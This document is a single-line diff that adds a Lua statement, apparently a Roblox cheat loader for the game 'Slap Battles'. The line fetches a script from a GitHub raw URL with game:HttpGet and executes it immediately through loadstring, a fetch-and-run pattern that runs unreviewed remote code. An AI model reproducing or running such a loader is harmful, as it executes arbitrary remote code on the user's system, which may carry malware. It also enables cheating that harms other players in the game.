@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/update-slap-battles-spam0-xbv1p526mbvu7z.lua"))()
